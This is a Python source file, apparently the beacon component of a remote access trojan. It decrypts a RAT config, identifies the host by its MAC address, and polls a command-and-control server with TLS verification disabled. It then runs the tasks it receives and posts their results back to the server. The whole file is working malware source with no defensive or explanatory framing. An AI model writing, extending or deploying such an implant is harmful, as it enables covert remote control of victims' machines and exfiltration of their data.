# beacon.py
import sys
sys.path.append(".")
import time
import requests
import uuid
import json
import urllib3

from config_decrypt import decrypt_config
from beacon_task_handler import handle_task

# Disable SSL warnings for self-signed HTTPS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Load and decrypt beacon configuration 
CONFIG = decrypt_config("rat_config.json.enc", "rat.key")

C2_URL = CONFIG.get("C2_URL", "http://<your_c2_server>:8080")
INTERVAL = CONFIG.get("INTERVAL", 15)
ENABLED_MODULES = CONFIG.get("ENABLED_MODULES", [])

UID = str(uuid.getnode())

def beacon():
    print(f"[*] Beacon started with UID: {UID}")
    print(f"[*] Polling C2 at {C2_URL} every {INTERVAL} seconds")
    print(f"[*] Enabled modules: {ENABLED_MODULES}")

    while True:
        try:
            response = requests.get(f"{C2_URL}/checkin/{UID}", timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                task = data.get("task", None)

                if task and task.get("module") != "none":
                    print(f"[+] Received task: {task}")
                    output = handle_task(task, UID, C2_URL, ENABLED_MODULES)
                    post_result(output)
                else:
                    print("[*] No new task. Standing by.")
        except Exception as e:
            print(f"[!] Beacon error: {str(e)}")

        time.sleep(INTERVAL)

def post_result(data):
    try:
        requests.post(f"{C2_URL}/submit/{UID}", data=data.encode(), verify=False)
        print("[+] Result sent to C2.")
    except Exception as e:
        print(f"[!] Failed to submit result: {str(e)}")

if __name__ == "__main__":
    beacon()
